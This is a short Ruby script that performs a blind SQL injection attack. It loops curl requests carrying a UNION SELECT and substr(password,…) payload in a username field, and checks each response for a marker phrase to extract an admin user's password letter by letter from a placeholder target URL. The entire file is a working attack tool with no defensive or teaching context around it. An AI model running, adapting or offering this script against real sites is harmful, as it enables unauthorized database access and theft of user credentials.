page_to_sql = 'http://example.com/index.php?id='
wrong_phrase = "INSERT_WRONG_PHRASE"
right_phrase = "INSERT_RIGHT_PHRASE"
num_letters = 20

res = ''
rep = 0
for j in(1..num_letters)
  rep = 1
  for i in('a'..'z')
    if rep==0 
    	break
    end
      req = `curl -s --data "username=000' union select username,username,username from users where password is not null  and username='admin' and substr(password,#{j.to_s},1)='#{i}'#" #{page_to_sql}`
		if req.include? right_phrase
			print "#{j.to_s}=#{i}; "
        	res << i
        	rep = 0
      else if i=='z'
          printf "NO; "
          res << "_#{j.to_s}_"
        end
      end
  end
end
puts
puts res